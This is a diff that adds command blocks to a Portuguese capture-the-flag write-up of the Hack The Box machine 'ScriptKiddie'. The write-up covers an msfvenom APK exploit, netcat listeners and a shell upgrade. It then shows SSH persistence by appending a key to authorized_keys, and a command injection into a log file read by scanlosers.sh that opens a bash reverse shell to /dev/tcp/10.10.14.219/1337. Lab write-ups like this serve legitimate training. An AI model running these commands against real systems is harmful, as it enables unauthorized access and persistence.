@@ -60,7 +60,10 @@ Acessando o serviço http da porta 5000, nos deparamos com um site de 'tools' ha
 Então vamos buscar por essa falha no metasploit:
 
 ![Image](https://i.imgur.com/Ur9uW3n.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+msfconsole
+search msfvenom
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Olhamos os campos obrigatórios do exploit:
 
@@ -69,6 +72,10 @@ Olhamos os campos obrigatórios do exploit:
 Setamos com nosso IP e porta desejada. Após executar o exploit ele criará um arquivo APK com nosso payload.
 
 ![Image](https://i.imgur.com/VoktRsV.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+set LHOST
+set LPORT
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Voltamos ao site da porta 5000 e setamos os campos como: 'Android' , '10.10.14.219' e selecionamos nosso arquivo
 
@@ -77,43 +84,77 @@ Voltamos ao site da porta 5000 e setamos os campos como: 'Android' , '10.10.14.2
 Após clicar em generate, a conexão chega em nosso netcat:
 
 ![Image](https://i.imgur.com/re79P0M.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvnlp 4444
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Usamos o python3 para melhorar nossa shell:
 
 ![Image](https://i.imgur.com/rSII9HK.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Geramos uma chave em nossa máquina:
 
 ![Image](https://i.imgur.com/eeXxCBN.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh-keygen
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Escrevemos a chave RSA dentro do arquivo authorized_keys para conseguirmos uma conexão SSH.
 
 ![Image](https://i.imgur.com/sCZrZML.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cd ~
+cd .ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB/yG5jVt5uMNZEmKDee60lHtYqNoxgmPLQ/m4RQ4Y7A1nzh4mLz7Qut2h/yxSNNh+6HdChsXwoIunQfRaBM491FpwGa7/6/wp+GeIkGEduw/pDEFG9holYghJUtX/epWjEJT4z7HNufRhAWHAT4DwJThSCStzvmySyyzoRtJXiImY5cSDmwO7Al4mjWRX8IZyjqN+VyuZD1CMTlf52UCqQv9Zxzg4486+I+MCGa6Va9lEQWT6fL780t1rIi+PpsToF8MDpCRWUCGRltNzDbgKVVTyi3uITWrUxDXUlmv9+ykvkf1ENUUQEHazf6eRc35Ghvadikh27pbpzn2AH3DAHln9A0gDHtLATzURVGNiPplW7azhS+ukeoJw7AAb9UP3NX6elacnjaW3fhVu+oV+H2CJ0yxC5pFfea7lq4EkpScYq6lP29+niIiCq5MUPh4ijGkGEZCRL8G+HNRvOXmSRuqmNs6L8= root@antisec" >> authorized_keys
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Depois de escreve-la, fazemos a conexão via SSH.
 
 ![Image](https://i.imgur.com/pqg9EbZ.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh kid@scriptkiddie.htb -i kid
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Listando as pastas da raiz do usuário kid, temos uma pasta chamada logs
 
 ![Image](https://i.imgur.com/UbfufK8.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ls -la
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Dentro dessa pasta chamada logs, existe um arquivo chamado hackers que faz parte do grupo 'pwn'
 
 ![Image](https://i.imgur.com/W5ty0Le.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ls -la
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Na pasta do usuário pwn (/home/pwn) temos um bash script chamado scanlosers.sh que interage com o arquivo hackers, o qual temos permissão de escrita.
 
 ![Image](https://i.imgur.com/ktXrPA3.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cd /home/pwn
+cat scanlosers.sh
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Portanto, usamos o echo para inserir um comando e quebrar a syntax do código scanlosers.sh e executar um comando nosso.
+O script usa o 'cut -d ' ' -f3-' então vamos passar 3 espaçõs iniciais e rodar um comando em seguida.
 
 ![Image](https://i.imgur.com/W8fDCUs.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cd /home/kid/logs
+echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.219/1337 0>&1' #" >> hackers
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Ao fazer isso, recebemos a conexão já como usuário pwn :)
 
 ![Image](https://i.imgur.com/2t9MkbF.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvnlp 1337
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 ![Image](https://i.imgur.com/a4gOhX0.png)
